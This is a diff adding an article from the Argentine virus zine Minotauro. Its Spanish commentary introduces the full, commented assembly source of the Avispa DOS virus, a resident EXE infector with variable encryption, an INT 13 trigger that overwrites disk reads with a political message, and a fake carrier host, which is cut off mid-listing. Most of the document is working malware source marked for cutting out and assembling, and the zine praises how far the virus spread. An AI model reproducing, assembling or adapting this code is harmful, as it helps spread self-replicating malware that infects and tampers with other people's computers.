@@ -1,0 +1,929 @@
+Producci¢n Nacional #1 : Avispa...
+-------------------------------------------------------------------------------
+
+	Esta es una nueva seccion en Minotauro, dedicada exclusivamente a los
+virus producidos en Argentina. El virus de hoy es el Avispa, escrito por
+Elijah Baley. A este virus se lo ha llamado 'polimorfico'. Sin embargo, no lo
+es del todo, ya que mas que polimorfosear la rutina de desencripcion, le
+cambia algunos bytes al azar. Mas que polimorfismo, es encripcion variable.
+	El virus infecta EXE de la manera tradicional, y es residente. El
+modo de residencia es el mas sencillo y obvio, pues usa sencillamente la
+llamada al DOS (ver el articulo de Modos de residencia en este mismo numero,
+por Zarathustra). Ademas tampoco esta demasiado bien escrito, hay un pedazo de
+codigo muerto y algunos 'datos' que no se usan nunca, y por si esto fuera poco,
+la implementacion de la rutina de infeccion es bastante pobre, ya que abre y
+cierra el file que esta infectando como 3 o 4 veces. Un poco de planificacion
+y organizacion hubieran evitado esto.
+	Pero a pesar de todo, este virus tiene un punto a su favor. Se trata
+del auto reconocimiento. Mientras otros virus encriptados reconocen los files
+previamente infectados poniendo una 'marca' en el time/date del file, quedando
+al descubierto a la flag del TBAV y otras inconveniencias, este virus
+implementa un sencillo pero MUY original metodo de Checksum. En definitiva,
+una idea lo bastante buena como para imponerse :-).
+
+% El disparador %
+	El virus tiene un disparador, pero no es destructivo. Si se trata de
+leer de disco (int 13) aproximadamente una vez cada hora el virus va a
+sobreescribir lo leido con el texto que insulta a Menem. (Obviamente lo
+sobreescribe en memoria. No es destructivo).
+	Sencillamente, intercepta la INT 13, y si se intenta leer de disco
+alguna pista mayor a la 10, y la palabra menos significativa de la variable de
+BIOS que almacena los "ticks since midnight" es cero (lo cual sucede una vez
+por hora aproximadamente), el virus primero lee normalmente el sector que le
+piden, y luego sobreescribe lo leido en memoria por el texto de Menem.
+
+% El polimorfismo %
+	El "polimorfismo" de este virus en realidad no lo es tal. El virus
+sencillamente variabiliza la rutina de desencripcion cambiando algunos de los
+bytes de manera azarosa.
+	Primero, en el seteo de los registros para la desencripcion, el virus
+variabiliza los MOVs. Por ejemplo, el virus guarda en BX el base address
+durante la encripcion. Para que el MOV para setear BX no sea siempre igual,
+el virus calcula un numero al azar y se lo resta a lo que tiene que mover
+a BX, y modifica el codigo. Veamos...
+	MOV BX, 0900	=	MOV BX, 0800	=	MOV BX, F600
+	ADD BX, 0000		ADD BX, 0100		ADD BX, 1300
+	Entienden? El virus hace esto con BX (address), CX (Encryption Key) y
+AX (para la comparacion para salir del loop). Otra forma de variabilizar del
+virus es intercambiar el orden de algunas instrucciones. Por ejemplo, el virus
+necesita incrementar en 2 BX en cada vuelta del loop. Esto lo hace de 4 formas
+distintas, las cuales va intercambiando en cada infeccion:
+	INC BX	=>    	INC BX	 =>	NOP     =>	ADD BX, 2
+	INC BX	    	NOP		INC BX
+	NOP         	INC BX		INC BX
+	Estos tres bytes, sin embargo, estan siempre en posiciones fijas. La
+ultima forma de variabilizar la rutina que tiene el virus son las ordenes
+trash. No hay un numero al azar de ordenes trash al azar, sino que dentro del
+codigo hay unos "lugares" predefinidos de 2 bytes, en los que las ordenes
+trash se pueden intercambiar. Y asi, por ejemplo, donde antes habia un
+PUSH AX/POP AX, ahora hay un MOV DL, DL.
+	Todo esto ayuda efectivamente a variabilizar la rutina de desencripcion
+pero tiene la terrible falla de que deja bytes fijos, y lo que es peor, en
+posiciones fijas. Esto hace posible (a los antivirusistas) definir una string
+que puede ser agregada a cualquier antivirus, usando wildcards. Esto ya es
+suficiente (a mi modo de ver) para decir que el "polimorfismo" del virus no es
+tan bueno.
+
+	De todas maneras, independientemente de las criticas tecnicas que
+puedan hacerse a este virus, lo que nadie puede discutir es que se disperso
+bastante. Esto le da suficiente "merito" como estar aqui :-), aparte del
+merito que tiene por haber sido el primer virus mas o menos "polimorfico" de
+Argentina. Recuerden, Produccion Nacional.
+								Trurl
+
+ El virus en si
+; --------------------- AVISPA : Cut Here -----------------------------------
+avispa		segment byte public
+; Desensamblado por Trurl para Minotaur Magazine #2.
+	assume cs:avispa, ds:avispa, es:avispa, ss:avispa
+	.186
+	org 100h
+; Virus: Avispa
+; Tipo: Residente, Parasitico, Infector de EXE, Encriptado
+; Size: 2048(+15) bytes.
+; Origen: Argentina
+Start:
+; Lo que viene a continuacion es la rutina desencriptora. Varia de infeccion
+; a infeccion en algunos bytes, pues el virus hace todo un intercambio.
+	MOV	BX,0
+	PUSH	CX
+	POP	CX
+	ADD	BL,0
+	PUSH	DX
+	POP	DX
+Decrypt:
+	MOV	AX,cs:[BX]
+	PUSH	DX
+	POP	DX
+	MOV	CX,0
+	PUSH	DX
+	POP	DX
+	SUB	CL,0
+	PUSH	SI
+	POP	SI
+	NOP
+	XOR	AX,CX
+	PUSH	SI
+	POP	SI
+	MOV	cs:[BX],AX
+	PUSH	SI
+	POP	SI
+	INC	BX
+	NOP
+	INC	BX
+	PUSH	SI
+	POP	SI
+	MOV	AX,0
+	PUSH	DI
+	POP	DI
+	ADD	AX,0
+	PUSH	DI
+	POP	DI
+	NOP
+	CMP	BX,AX
+	PUSH	DI
+	POP	DI
+	JB	Decrypt
+	NOP
+VirBegin:
+	JMP	StartVir
+; Data
+	fHandler	dw	0 ; Handler del file a infectar
+	OldEntryPoint	dd	0 ; CS:IP del header EXE
+	OldStackPtr	dd	0 ; SS:SP del header EXE
+	ErrorVar	db	0 ; Flag de error (1 ==> Error)
+	; la linea que sigue es un desperdicio de 4 bytes
+			db	0,0,0,0 ; al pedo 1
+	OldInt21	dd	0 ; Puntero a ISR de INT 21 original.
+	NamePtr		dd	0 ; Puntero a filename en llamada a 4B INT 21.
+	OldInt24	dd	0 ; Puntero a ISR de INT 24 original.
+	; esto ya es medio alevoso.
+			db	0,0,0,0 ; al pedo 2
+	OldInt13	dd	0 ; Puntero a ISR de int 13 original.
+	ReadBuffer	db	34h dup(?) ; Buffer para lectura (usado para autoreconocimiento del virus)
+	fAttr		dw	0 ; Atributo del file a infectar.
+	fTimeDate	dd	0 ; Time & Date del file.
+	BytePara	db	0 ; Nro. de bytes que faltan para el para.
+	ShitByte	db	0 ; byte para la garbage para poner al final.
+	MemBlock	dw	0 ; usado durante la infeccion.
+	; comienzo a sospechar que puso ceros para despistar.
+			db 	0, 0 ; al pedo 3
+	VirName	db	"__ Virus Avispa - Buenos Aires - Noviembre 1993 __"
+
+; ...........................................................................
+; Parte instaladora
+; Aqui viene el control luego de que el virus ha sido desencriptado.
+StartVir:
+	MOV	AX,4BFFh ; residence test
+	INT	21h	 ; definido por el mismo
+	CMP	AX,4BFEh
+	JNZ	Install_Virus ; Si no esta en memoria => Instalar virus
+; Esta en memoria. Correr hoste.
+	MOV	AX,word ptr cs:OldStackPtr+2
+	MOV	BX,DS
+	ADD	AX,10h
+	ADD	AX,BX   ; Pone en SS y SP sus valores originales
+	MOV	SS,AX   ; (del header exe previo a la infeccion).
+	MOV	AX,word ptr cs:OldStackPtr
+	MOV	SP,AX
+	MOV	AX,cs:word ptr OldEntryPoint+2; del CS:IP de entrada.
+	MOV	BX,DS	; Y a hora saltar al adress original
+	ADD	AX,10h
+	ADD	AX,BX
+	PUSH	AX
+	MOV	AX,cs:word ptr OldEntryPoint
+	PUSH	AX
+	RETF
+
+; No esta en memoria
+Install_Virus:
+	PUSH	DS	; Lo que esta haciendo es copiar su
+	POP	ES	; propio codigo, que esta al final del
+	MOV	DI,100h	; bloque de memoria del programa hoste
+	PUSH	CS	; al principio de este bloque, para asi
+	POP	DS	; quedar residente correctamente con
+	MOV	SI,100h	; una llamada normal a DOS.
+	CLD		; Esto produce que no pueda pasar el control al
+	MOV	CX,800h ; hoste entregando el control al CS:IP si tiene que
+	REPZ		; instalarse. Para hacerlo, debe correrlo via 4B.
+	MOVSB
+
+	PUSH	ES	; A continuacion salta al codigo que acaba de copiar.
+	PUSH  offset Branch_Address
+	RETF
+Branch_Address:
+	PUSH	CS	; modifica el bloque de memoria para
+	POP	DS	; ponerlo en 90 paragrafos
+	MOV	AH,4Ah	; (2304 bytes)
+	PUSH	CS
+	POP	ES
+	MOV	BX,90h
+	INT	21h
+
+; Colgadas de las interrupciones.
+	MOV	AX,3521h	; Obtener IVT entry de Int 21
+	INT	21h
+	MOV	word ptr OldInt21,BX; y guardarla.
+	MOV	word ptr OldInt21+2,ES
+	MOV	AX,3513h	; Obtener Int 13
+	INT	21h
+	MOV	word ptr OldInt13,BX; y guardarla
+	MOV	word ptr OldInt13+2, ES
+	MOV	AX,2521h	; hookear int 21
+	MOV	DX,offset NewInt21
+	INT	21h
+	MOV	AX,2513h	; hookear int 13
+	MOV	DX,offset NewInt13
+	INT	21h
+
+	MOV	ES,word ptr ds:[2Ch]
+	MOV	BX,0
+GetName:
+	MOV	AX,es:[BX]
+	CMP	AX,0
+	JZ	GotName
+	INC	BX
+	CMP	BX,12Ch
+	JNZ	GetName
+	;JMP	KeepRes ; Este JMP hay que hacerlo HARD CODED!
+aux_1:	db 0e9h
+	dw offset KeepRes-3-offset aux_1
+
+; Zona de datos. Es usado para llamar a prog orign.
+DataForRun:
+	dw 	 ?	; Environment Segment
+	dw       0080H
+	dw	 ?      ; Far pointer to Command Line
+	dw	 005CH
+	dw	 ?      ; Far pointer to FCB 1
+	dw	 006CH
+	dw	 ?      ; Far pointer to FCB 2
+GotName:
+	ADD	BX,4
+	MOV	DX,BX
+	MOV	word ptr DataForRun,ES
+	MOV	word ptr DataForRun+4,CS
+	MOV	word ptr DataForRun+8,CS
+	MOV	word ptr DataForRun+12,CS
+	MOV	BX,offset DataForRun
+	PUSH	ES
+	POP	DS
+	PUSH	CS
+	POP	ES
+	MOV	AX,4B00h
+	PUSH	CS
+	POP	SS
+	MOV	SP,900h
+	PUSHF
+	CALL	dword ptr cs:OldInt21
+	PUSH	DS
+	POP	ES
+	MOV	AH,49h
+	INT	21h
+; Quedar residente mediante INT21 AH=31. con 90 para.
+KeepRes:
+	MOV	AH,31h
+	MOV	DX,90h
+	INT	21h
+; El codigo que sigue es un absoluto desperdicio de 4 bytes.
+; Quiza Elijah no sabia que AH=31 INT 21 no devuelve el control :-)
+; (te digo de buena onda, Elijah, hehe)
+	MOV	AH,4Ch
+	INT	21h
+
+; ...........................................................................
+; Rutinas residentes
+
+NewInt21:
+	CMP	AX,4BFFh
+	JNZ	GoOn
+	DEC	AX		; residence test
+	IRET
+; no es residence test.
+GoOn:
+	CMP	AX,4B00h	; Es funcion Run program?
+	JZ	RunProgramFunc
+	JMP	dword ptr cs:OldInt21 ; no => INT 21 original.
+
+RunProgramFunc:
+	PUSHA
+	PUSH	ES
+	PUSH	DS
+	MOV	cs:word ptr NamePtr+2,DS; guardar ds
+	MOV	cs:word ptr NamePtr,DX	; y dx en memoria cuidadosamente.
+	CALL	Infect			; llamar a rutina infectora.
+	POP	DS
+	POP	ES
+	POPA
+	JMP	dword ptr cs:OldInt21	; int 21 original.
+
+Infect:
+	CALL	CheckName	; chequeo del nombre
+	PUSH	CS
+	POP	DS
+	CMP	AH,0		; Si el nombre = OK infecta.
+	JZ	NameIsOk
+	MOV	AH,1		; si el nombre del file termina con
+	RET			; AN, LD, OT, an, ld, ot, no infecta
+
+NameIsOk:
+	MOV	AH,3Dh		; Abrir el file para r/w
+	MOV	AL,2
+	MOV	DX,word ptr NamePtr
+	MOV	DS,cs:word ptr NamePtr+2
+	PUSHF
+	CALL	dword ptr cs:OldInt21
+	JB	ErrorAndGetOut	; Si hubo error => Sale
+	PUSH	CS
+	POP	DS
+	MOV	fHandler,AX	; Guardar el handler
+	MOV	BX,AX
+
+	MOV	AH,3Fh		; Leer 7f bytes a offset 80.
+	MOV	CX,7Fh		; (cs:80+80h =  cs:ff, je je)
+	MOV	DX,80h
+	PUSHF
+	CALL	dword ptr cs:OldInt21
+
+	MOV	AH,3Eh
+	MOV	BX,fHandler
+	PUSHF
+	CALL	dword ptr cs:OldInt21	; cerrar file.
+
+	CMP	WORD PTR ds:[80h],5A4Dh	; Si no es exe, no infecta
+	JNZ	ErrorAndGetOut
+	CMP	WORD PTR ds:[94h],0	; Si CS o IP=0, AH=1 y
+	JNZ	ProceedInfect				; no infecta.
+	CMP	WORD PTR ds:[96h],0	; sino, infecta. (335)
+	JZ	ErrorAndGetOut
+	;JMP	ProceedInfect 		; otro que hay que hacer hard coded
+aux_2:	db 0e9h
+	dw offset ProceedInfect-offset aux_2-3
+
+ErrorAndGetOut:
+	MOV	AH,1
+	RET
+
+ProceedInfect:
+	PUSH	CS
+	POP	DS
+	MOV	AH,3Dh			; reabre el file.
+	MOV	AL,2
+	MOV	DX,word ptr NamePtr
+	MOV	DS,word ptr cs:NamePtr+2
+	PUSHF
+	CALL	dword ptr cs:OldInt21
+
+	JB	ErrorAndGetOut		; Si hubo error => Sale con error
+	PUSH	CS
+	POP	DS
+	MOV	fHandler,AX		; Guarda el handler de nuevo
+	MOV	AX,4202h		; Mover el puntero al final del
+	MOV	BX,fHandler		; file.
+	MOV	DX,0
+	MOV	CX,0
+	INT	21h
+	CMP	AX,34h			; Si ax>= 34h ==> dx
+	JB	DecDx			; Si ax<34h ==> dx--;
+	;JMP	Sub34 ; otro hard coded
+aux_3:	db 0e9h
+	dw offset Sub34-offset aux_3-3
+DecDx:
+	DEC	DX
+Sub34:
+	SUB	AX,34h       ; Le resta 34h al size del file.
+	MOV	CX,DX
+	MOV	DX,AX
+	MOV	AX,4200h
+	MOV	BX,fHandler  ; Mueve el ptr 34h bytes adelante
+	INT	21h	     ; del eof.
+
+	MOV	AH,3Fh	     ; Lee 34h bytes a Buffer
+	MOV	BX,fHandler
+	MOV	CX,34h
+	MOV	DX,offset ReadBuffer
+	INT	21h
+
+	MOV	AH,3Eh	     ; Cierra el file.
+	MOV	BX,fHandler
+	INT	21h
+
+	MOV	BX,offset ReadBuffer ; Esta porcion de codigo es para
+	MOV	CX,[BX]		     ; auto-reconocerse.
+	ADD	BX,2		     ; Mientras otros virus encriptados y
+	MOV	DX,0		     ; polimorficos se reconocen
+LoopChecksum:			     ; manipulando la fecha u hora del file,
+	MOV	AX,[BX]		     ; este implementa una especie de
+	XOR	AX,CX		     ; checksum. Muy Bueno.
+	ADD	DX,AX
+	INC	BX
+	INC	BX
+	CMP	BX,offset ReadBuffer+34h
+	JNZ	LoopChecksum
+	CMP	DX,7DDAh
+	JNZ	NotInfected	; Si no esta, ==> NotInfected
+GetOut:
+	JMP	ErrorAndGetOut		; Si ya esta infectado, sale
+NotInfected:
+	MOV	AX,3524h		; Guarda viejo vector y captura
+	INT	21h			; la int de Critical error handler
+	MOV	word ptr OldInt24,BX	; a una rutina 'dummy'
+	MOV	word ptr OldInt24+2,ES
+	MOV	AX,2524h
+	MOV	DX,offset NewInt24 	; dummy error handler
+	INT	21h
+
+	MOV	AH,43h			; Obtiene el atributo del file.
+	MOV	AL,0
+	MOV	DX,word ptr NamePtr
+	MOV	DS,cs:word ptr NamePtr+2
+	INT	21h
+
+	PUSH	CS
+	POP	DS
+	MOV	BYTE PTR ErrorVar,0	; pone 0 en la variable de er.
+	MOV	fAttr,CX		; guarda el atributo.
+
+	MOV	AH,43h			; Pone el atributo del file.
+	MOV	AL,1			; a 0, pasando por encima de la
+	MOV	DX,word ptr NamePtr	; flag ReadOnly
+	MOV	CX,0
+	MOV	DS,cs:word ptr NamePtr+2
+	INT	21h
+	; JMP	Skip1 ; otro hard coded y van... pero con que mierda
+aux_4:	db 0e9h; ensambla este tipo?
+	dw offset Skip1-offset aux_4-3
+NearGetOut:
+	JMP	GetOut
+Skip1:
+	PUSH	CS
+	POP	DS
+	MOV	AX,2524h		; Vuelve a poner en el valor original
+	MOV	DX,word ptr OldInt24	; al vector de INT 24
+	MOV	DS,cs:word ptr OldInt24+2
+	INT	21h
+
+	PUSH	CS
+	POP	DS
+	CMP	BYTE PTR ErrorVar,1	; Ve la flag de error.
+	JZ	GetOut			; si lo hubo, sale
+
+; si no hubo error, sigue aqui
+	MOV	AH,3Dh			; Reabre el file (3ra vez!) en
+	MOV	AL,2			; modo lectura escritura/
+	MOV	DX,word ptr NamePtr
+	MOV	DS,cs:word ptr NamePtr+2
+	PUSHF
+	CALL	dword ptr cs:OldInt21
+
+	JB	NearGetOut		; si hubo error, sale
+	PUSH	CS
+	POP	DS
+	MOV	fHandler,AX		; guarda el handler
+
+	MOV	AH,57h			; Obtiene la vieja time&date
+	MOV	AL,00			; stamp del file
+	MOV	BX,fHandler
+	INT	21h
+	MOV	word ptr fTimeDate,DX	; y la guarda
+	MOV	word ptr fTimeDate+2,CX
+	MOV	BYTE PTR BytePara,0	; clarea la cuenta de bytes para el paragr.
+
+RoundToPara:
+	MOV	AX,4202h		; mueve el puntero al fin del file
+	MOV	BX,fHandler
+	MOV	CX,0
+	MOV	DX,0
+	INT	21h
+	CMP	CX,0fh
+	JA	NearGetOut2
+
+	MOV	BX,10h			; Ve si el file termina en paragrafo
+	DIV	BX
+	CMP	DX,0
+	JZ	RoundedUp		; Termina en para => RoundedUp
+
+	MOV	AH,40h			; Si no termina el paragrafo, 
+	MOV	BX,fHandler		; escribe un byte de "shitbyte"
+	MOV	CX,1			; y vuelve a empezar todo.
+	MOV	DX,offset ShitByte
+	INT	21h
+	MOV	AH,BytePara		; incrementa el nro. de bytes para el
+	INC	AH			; paragrafo.
+	MOV	BytePara,AH
+	JMP	RoundToPara
+
+; Si al pedir largo de file, CX = 15 viene aca
+NearGetOut2:
+	PUSH	CS
+	POP	DS
+	MOV	AH,3Eh				; Cierra el file
+	MOV	BX,fHandler
+	INT	21h
+	MOV	AH,1				; y vuelve con error.
+	RET
+
+; Aqui ya redondeo el fin del file en paragrafo.
+; El header EXE del file esta en offset 80.
+RoundedUp:
+	SUB	AX,10h		; En ax tenia el numero de parafos del file.
+
+	MOV	CX,ds:[84h]	; Modifica el numero de 'paginas'
+	ADD	CX,4		; de 512 b. del header exe
+	MOV	ds:[84h],CX
+	SUB	AX,ds:[88h]	; (le resta el header size)
+	MOV	CX,ds:[94h]	; Guarda en variables el viejo entry point.
+	MOV	word ptr OldEntryPoint,CX
+	MOV	CX,ds:[96h]
+	MOV	word ptr OldEntryPoint+2,CX
+	MOV	CX,ds:[8Eh]	; Idem el viejo SS:SP
+	MOV	word ptr OldStackPtr+2,CX
+	MOV	CX,ds:[90h]
+	MOV	word ptr OldStackPtr,CX
+
+	MOV	ds:[96h],AX		; Modifica el CS del header
+	MOV	ds:[8Eh],AX		; Modifica el SS del header
+	MOV	WORD PTR ds:[90h],900h  ; pone sp
+	MOV	WORD PTR ds:[94h],100h  ; e ip a valores constantes
+	MOV	AX,ds:[82h]
+	SUB	BX,BX
+	MOV	BL,BytePara
+	ADD	AX,BX
+	MOV	ds:[82h],AX		; Modifica el reminder
+	MOV	AH,48h
+	MOV	BX,90h			; pide un 2do bloque de memoria.
+	INT	21h			; de 90 para.
+	JB	NearGetOut2		; si error => sale
+	MOV	cs:word ptr MemBlock,AX	; guarda el seg del bloque obt.
+	MOV	ES,MemBlock
+	MOV	DI,100h
+	MOV	SI,100h
+	CLD
+	MOV	CX,800H	;?		 ; se copia en ese bloque.
+	REPZ
+	MOVSB
+
+	CALL	VariableEncryption	; Variabiliza la otra copia del vir.
+	PUSH	CS
+	POP	DS
+	MOV	BX,fHandler		; escribe al final del file la
+	MOV	CX,800H			; copia del otro bloque
+	MOV	AH,40h
+	MOV	DX,100h
+	MOV	DS,cs:MemBlock
+	INT	21h
+	PUSH	CS
+	POP	DS
+	MOV	AH,42h			; se mueve al principio del file
+	MOV	AL,0
+	MOV	BX,fHandler
+	MOV	CX,0
+	MOV	DX,0
+	INT	21h
+	MOV	AH,40h			; escribe el header exe modified
+	MOV	BX,fHandler
+	MOV	CX,1Eh
+	MOV	DX,80h
+	INT	21h
+
+	PUSH	CS
+	POP	DS
+	MOV	AH,57h			; repone la vieja time and date
+	MOV	AL,1			; stamp
+	MOV	CX,word ptr fTimeDate+2
+	MOV	DX,word ptr fTimeDate
+	MOV	BX,fHandler
+	INT	21h
+	MOV	AH,3Eh			; cierra el file
+	MOV	BX,fHandler
+	INT	21h
+	MOV	AH,43h			; repone el viejo atributo
+	MOV	AL,1
+	MOV	CX,fAttr
+	MOV	DX,word ptr NamePtr
+	MOV	DS,cs:word ptr NamePtr+2
+	INT	21h
+	PUSH	CS
+	POP	DS
+	MOV	AH,49h			; libera el bloque de memoria
+	MOV	ES,MemBlock
+	INT	21h
+	MOV	AH,0
+	RET				; sale
+
+	CryptKey		dw	0; Variable de Encripcion
+GarbageInstruccions:
+; Estas instrucciones-basura son usadas para variabilizar la rutina de
+; desencripcion del virus durante la encripcion.
+	MOV	AH,AH
+	MOV	BH,BH
+	MOV	CH,CH
+	MOV	DH,DH
+	MOV	AL,AL
+	MOV	BL,BL
+	MOV	CL,CL
+	MOV	DL,DL
+	PUSH	AX
+	POP	AX
+	PUSH	BX
+	POP	BX
+	PUSH	CX
+	POP	CX
+	PUSH	DX
+	POP	DX
+	PUSH	SI
+	POP	SI
+	PUSH	DI
+	POP	DI
+	PUSH	ES
+	POP	ES
+	PUSH	DS
+	POP	DS
+	MOV	CL,CL
+
+VariableEncryption:
+; La llama ANTES de escribir el codigo en el 2do bloque de mem.
+; Como se puede ver, no es polimorfismo sino en todo caso "encripcion variable"
+	MOV	DS,cs:MemBlock	; mueve a ds el 2 bloque del v.
+	PUSH	AX
+	MOV	AX,0040h
+	MOV	ES,AX
+	POP	AX
+	XOR	DX,DX			; lee el byte menos significat
+	MOV	DL,es:[6Ch]		; de los ticks since midnight
+	MOV	CX,offset VirBegin; le resta a 314 (13a) eso.
+	SUB	CL,DL
+	MOV	word ptr Start+1,CX	; guarda resto en orden mov
+	MOV	WORD PTR Start+5,0C380h ; pone "add bl, "
+	MOV	byte ptr Start+7,DL	; y el dl en orden add
+	MOV	DX,es:[6Ch]		; en DX a los ticks le suma
+	ADD	DX,CS:MemBlock		; el seg del bloque
+	MOV	CS:CryptKey,DX		; y lo guarda
+	MOV	CX,ES:[6Ch]		; a la word - sign. de los  ticks le
+	ADD	CX,ES:[6Eh]		; suma la word + significativa.
+	MOV	CH,0			; Todo esto es para sacar un valor
+	ADD	DL,CL			; mas o menos azaroso.
+	MOV	word ptr Start+10h,DX   ; y guarda
+	MOV	byte ptr Start+16h,CL
+	MOV	AX,CX
+
+	; Para Randomizar el XOR AX, CX | NOP
+	JPE	IsEven
+	MOV	WORD PTR Start+19h,0C133h; si no es par =>
+	MOV	BYTE PTR Start+1bh,90h	; xor ax, cx | nop
+	; JMP	IsOdd ; increible. que ensambla, en A86? caray!
+aux_5:	db 0e9h
+	dw offset IsOdd-offset aux_5-3
+IsEven:
+	MOV	BYTE PTR Start+19h,90h	; si es par =>
+	MOV	WORD PTR Start+1ah,0C133h; nop | xor ax, cx
+
+	; Zona para Randomizar el ADD BX, 2
+IsOdd:
+	CMP	WORD PTR Start+23h,4343h ; inc bx | inc bx | nop?
+	JZ	IsIncIncNop
+	CMP	WORD PTR Start+24h,4343h ; nop | inc bx | inc bx?
+	JZ	IsNopIncInc
+	CMP	WORD PTR Start+23h,0C383h ; add bx, ?
+	JZ	IsAdd
+	MOV	WORD PTR Start+23h,4343h ; inc bx | nop | inc bx =>
+	MOV	BYTE PTR Start+25h,90h	; INC BX | INC BX | NOP
+	; JMP	Skip2Next ; esto ya es una joda
+aux_6:	db 0e9h
+	dw offset Skip2Next-offset aux_6-3
+IsIncIncNop:
+	MOV	BYTE PTR Start+23h,90h	; inc bx | inc bx | nop
+	MOV	WORD PTR Start+24h,4343h ; NOP | INC BX | INC BX
+	; JMP	Skip2Next ; esto ya me esta cansando
+aux_7:	db 0e9h
+	dw offset Skip2Next-offset aux_7-3
+IsNopIncInc:
+	MOV	WORD PTR Start+23h,0C383h ; nop | inc bx | inc bx
+	MOV	BYTE PTR Start+25h,2		; SUB AX, 2
+	; JMP	Skip2Next ; de mas esta decir que tengo las pelotas hasta el suelo
+aux_8:	db 0e9h
+	dw offset Skip2Next-offset aux_8-3
+IsAdd:
+	MOV	BYTE PTR Start+23h,43h	; add bx, ?
+	MOV	BYTE PTR Start+24h,90h	; INC BX | NOP | INC BX
+	MOV	BYTE PTR Start+25h,43h
+
+	; Zona para Randomizar el mov ax, fin
+Skip2Next:
+	MOV	CX,8CCh ; largo total
+	MOV	DX,es:[6Dh]
+	SUB	CX,DX
+	MOV	word ptr Start+29h,CX
+	MOV	word ptr Start+2eh,DX
+	MOV	AX,DX
+	; Zona para randomizar el cmp bx, ax | nop
+	JPE	IsEven2
+	MOV	WORD PTR Start+32h,0C339h
+	MOV	BYTE PTR Start+34h,90h
+	; JMP	DoneCmpNop; si encuentro al autor del A86 lo castro
+aux_9:	db 0e9h
+	dw offset DoneCmpNop-offset aux_9-3
+IsEven2:
+	MOV	BYTE PTR Start+32h,90h
+	MOV	WORD PTR Start+33h,0C339h
+	; Zona para agregar ordenes trash
+DoneCmpNop:
+	MOV	CX,0Bh
+	MOV	BX,offset Start+3
+AddTrash:
+	XOR	DX,DX		; Esta parte del codigo cambia las "ordenes
+	XOR	AX,AX		; basura" de la rutina de encripcion.
+	MOV	AL,es:[6Ch]
+	ADD	AL,BL
+	MOV	DL,10h
+	DIV	DL
+	ADD	AL,AL
+	MOV	AH,00
+	MOV	SI,offset GarbageInstruccions
+	ADD	SI,AX
+	MOV	DX,cs:[SI]
+	MOV	[BX],DX
+	ADD	BX,5
+	LOOP	AddTrash
+
+	; Parte para encriptar el codigo en si.
+	PUSH	CS
+	POP	DS
+	MOV	ES,MemBlock	; ES <= VIRUS SEGMENT
+	MOV	BX,offset VirBegin; BX <= BASE ADRESS
+	MOV	CX,CryptKey	; CX <= ENCRYPTION KEY
+EncryptIt:
+	MOV	AX,ES:[BX]
+	XOR	AX,CX
+	MOV	ES:[BX],AX
+	INC	BX
+	INC	BX
+	CMP	BX,8CCh
+	JB	EncryptIt
+
+	; Esta parte es para poner trash en la ultima parte del virus
+	PUSH	CS
+	POP	DS
+	MOV	DI,8CEh
+	MOV	ES,MemBlock
+	MOV	SI,offset VirName
+	CLD
+	MOV	CX,32h
+	REPZ
+	MOVSB
+	PUSH	AX
+	MOV	AX,40h
+	MOV	ES,AX
+	POP	AX
+	MOV	CX,es:[6Ch]
+	MOV	ES,cs:MemBlock
+	MOV	es:[8CCh],CX
+	MOV	BX,8CEh
+TooMuchShit:
+	MOV	AX,es:[BX]
+	XOR	AX,CX
+	MOV	es:[BX],AX
+	INC	BX
+	INC	BX
+	CMP	BX,900h
+	JB	TooMuchShit
+	RET
+
+CheckName: ; Compara si el nombre dado en DS:DX
+; Si las ultimas dos letras son AN, LD, OT, o an, ld, ot, devuelve 1 en ah
+; si no devuelve ah=0
+	MOV	BX,DX
+GetPoint:
+	CMP	BYTE PTR [BX],2Eh		; busca el punto, para ext.
+	JZ	GotPoint
+	INC	BX
+	JMP	GetPoint
+GotPoint:
+	CMP	WORD PTR [BX-2],4E41h; Ultimas dos letras AN
+	JZ	BadName
+	CMP	WORD PTR [BX-2],6E61h; Ultimas dos letras an
+	JZ      BadName
+	CMP	WORD PTR [BX-2],444Ch; Ultimas dos letras LD
+	JZ      BadName
+	CMP	WORD PTR [BX-2],646Ch; Ultimas dos letras ld
+	JZ      BadName
+	CMP	WORD PTR [BX-2],544Fh; Ultimas dos letras OT
+	JZ      BadName
+	CMP	WORD PTR [BX-2],746Fh; Ultimas dos letras ot
+	JZ      BadName
+	MOV	AH,0
+	RET
+BadName:
+	MOV	AH,1
+	RET
+
+NewInt24: ; errorhandler
+; Rutina 'dummy' para int 24.
+; Excepto que setea una variable a uno.
+	MOV	BYTE PTR cs:ErrorVar,1
+	IRET
+
+NewInt13:
+; Rutina reemplazo int 13.
+	CMP	AH,2			; Es para lectura?
+	JZ	ReadFunc
+BackToInt13:
+	JMP	dword ptr CS:OldInt13	; Si no, llama a int 13 original.
+; es para lectura
+ReadFunc:
+	CMP	CH,0Ah		; Si nro. de track<10=int 13 orig.
+	JB	BackToInt13
+; Esto es el disparador ...
+	PUSH	ES
+	PUSH	AX
+	PUSH	AX
+	MOV	AX,40h		; Se fija variable de BIOS en
+	MOV	ES,AX		; 40:6C = Timer ticks since midnight
+	POP	AX		; Es un DWORD.
+	MOV	AX,es:[6Ch]
+	CMP	AX,0
+	JZ	ItsZero		; Si es cero: => 75a
+	POP	AX
+	POP	ES
+	JMP	BackToInt13	; Si != 0, Int 13 orign.
+ItsZero:
+	POP	AX
+	POP	ES
+	PUSHF
+
+	CALL	dword ptr cs:OldInt13; Llama a int 13 original con
+	JB	ReadError	; Valores originales. Error => sale
+
+	PUSHA
+	PUSH	ES
+	PUSH	DS
+	PUSH	CS
+	POP	DS
+	MOV	DI,BX		; Sobreescribe lo leido con el texto
+	MOV	SI,offset Text	; mas abajo
+	MOV	CX,200h
+	CLD
+	REPZ
+	MOVSB
+	POP	DS
+	POP	ES
+	POPA
+ReadError:
+	IRET
+
+	; Texto para intercambio.
+	; Este texto es el que escribe etc. etc. (ver arriba).
+Text	db "$$ Virus AVISPA $$ Republica Argentina$$ Elijah Baley "
+	db "$$ Noviembre 10 de 1993 "
+	db "$$ This program is not an old virus variant, and it was written "
+	db "in Argentina by Elijah Baley. It uses polymorphic technics to"
+	db " avoid conventional scanning."
+	db "$$ MENEM: Libertador de torturadores y asesinos de inocentes, que"
+	db " Dios se apiade de tu pobre alma. $$ 64446"
+ends avispa
+end Start
+; --------------------- AVISPA : Cut Here -----------------------------------
+
+ El carrier
+; -------------------- Fake Hoste : Cut Here --------------------------------
+hoste		segment byte public
+	assume cs:hoste, ds:hoste, es:hoste, ss:hoste
+	org 100h
+FakeHoste:
+	mov ax, 4bffh
+	int 21h
+	cmp ax, 4bfeh
+	jnz InstallIt
